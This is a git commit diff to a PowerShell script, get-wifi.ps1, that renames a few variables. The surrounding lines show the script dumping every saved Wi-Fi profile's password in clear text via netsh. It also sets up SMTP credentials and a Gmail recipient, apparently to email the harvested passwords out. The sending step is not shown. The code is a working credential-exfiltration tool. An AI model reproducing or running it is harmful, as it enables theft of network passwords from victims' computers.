6c0e5b8f22ebe322fc7e607d82714eaee9dda02d
dadmins1984 <116805139+dadmins1984@users.noreply.github.com>
2022-10-28 20:01:20 +0200

    Update get-wifi.ps1

--- get-wifi.ps1
+++ get-wifi.ps1
@@ -1,9 +1,9 @@
 $SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
 $secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
-$user = $username + "@interia.pl"
+$user = $u + "@interia.pl"
 $cred = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
 $Subject = "WiFi"
-$To = $Too + "@gmail.com"
+$To = $T + "@gmail.com"
 
 $p = @()
 $p += (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASS=$pass }} 
